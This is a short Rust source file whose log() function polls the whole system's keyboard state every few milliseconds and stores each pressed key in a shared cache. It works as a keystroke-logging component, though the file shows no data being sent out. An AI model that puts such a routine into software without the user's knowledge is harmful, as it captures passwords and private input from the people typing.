use std::{thread, time};

use device_query::{DeviceQuery, DeviceState, Keycode};

use crate::ram::PubInfo;

pub fn log() {
    let (mut last_key, mut repeat): (Vec<Keycode>, u8) = (vec![], 0);
    loop {
        let keys = DeviceState::new().get_keys();
        if keys != last_key || repeat > 100 {
            repeat = 0;
            last_key = keys.clone();
            for key_pressed in keys {
                PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
            }
        } else { repeat += 1; }
        thread::sleep(time::Duration::from_millis(5))
    }
}
